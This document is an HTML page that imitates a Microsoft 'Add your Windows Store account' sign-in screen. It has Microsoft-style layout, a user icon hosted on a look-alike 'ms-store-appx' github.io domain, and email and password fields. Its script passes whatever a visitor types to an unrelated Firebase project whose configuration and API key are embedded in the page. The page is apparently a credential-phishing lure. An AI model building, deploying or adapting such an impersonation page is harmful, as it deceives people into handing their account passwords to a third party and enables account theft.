<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Add your Microsoft account</title>

<!-- Firebase v8 (last version that supports IE) -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>

    <script>
        // Firebase config
        var firebaseConfig = {
            apiKey: "AIzaSyB-HcaLk_7baILVTztlP7TznAgunFQZ2jo",
            authDomain: "wsrp-69b37.firebaseapp.com",
            projectId: "wsrp-69b37",
            storageBucket: "wsrp-69b37.firebasestorage.app",
            messagingSenderId: "202033517304",
            appId: "1:202033517304:web:759391e944c720ef0f610d"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);

        function login() {
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            firebase.auth().signInWithEmailAndPassword(email, password)
                .then(function(userCredential) {
                    alert("Logged in successfully!");
                })
                .catch(function(error) {
                    alert("Error: " + error.message);
                });
        }
    </script>
<style>
    body {
        margin: 0;
        padding: 0;
        font-family: "Segoe UI", sans-serif;
        background: #2A2F7A; /* purple-blue background */
        color: #ffffff;
    }

    /* Main content area */
    #content {
        padding: 60px 80px 40px 350px;
	position: relative;
    }

    .title {
        font-size: 32px;
        font-weight: 300;
        margin-bottom: 10px;
	margin-top: 60px;
	position: relative;
    }

    .subtitle {
        font-size: 16px;
        margin-bottom: 40px;
        max-width: 520px;
    }

    /* Layout for icon + fields */
    #account-row {
        margin-top: 20px;
    }

    #icon {
        width: 70px;
        height: 70px;
        margin-bottom: 25px;
    }

    input {
        display: block;
        width: 400px;
        padding: 5px;
        margin-bottom: 12px;
        border: 1px solid #ffffff;
        background: white;
        color: black;
        font-size: 14px;
    }

    input::placeholder {
        color: black;
    }

    a {
        color: #ffffff;
        text-decoration: none;
        font-size: 14px;
    }

    /* Bottom-right buttons */
    #buttons {
        position: absolute;
        right: 25%;
        bottom: 22%;
    }

    .btn {
        min-width: 90px;
        padding: 8px 18px;
        margin-left: 10px;
        border: 1px solid #ffffff;
        background: transparent;
        color: #ffffff;
        font-size: 14px;
        cursor: pointer;
    }

    .btn-primary {
        background: #ffffff;
        color: #2A2F7A;
    }

    /* Bottom gray bar */
    #footer {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
	height: 15%;
        background: #8D8D8D;
        color: #000000;
        font-size: 13px;
        padding: 10px 80px;
    }

    #header {
	position: absolute;
        width: 100%;
	height: 15%;
        background: #8D8D8D;
        color: #000000;
        font-size: 13px;
        padding: 0px;
	margin: 0;
    }
</style>
</head>
<body>
<div id="header">
    
</div>
<div id="content">

    <div class="title">Add your Windows Store account</div>
    <div class="subtitle">
        We'll save this info so you can use your account with the Windows Store.
    </div>

    <div id="account-row">
        <div id="icon"><img src="https://ms-store-appx.github.io/storefront/storecdn/content-distribution/storeAssets/images/user.png" height=70></div>

        <input type="email" placeholder="Email address" id="email">
        <input type="password" placeholder="Password" id="password">

        <a href="#">Sign up for a Windows Store account</a>
    </div>
</div>

<div id="buttons">
    <button class="btn btn-primary" onclick="login()">Save</button>
    <button class="btn" onclick="history.back()">Cancel</button>
</div>

<div id="footer">
    
</div>

</body>
</html>
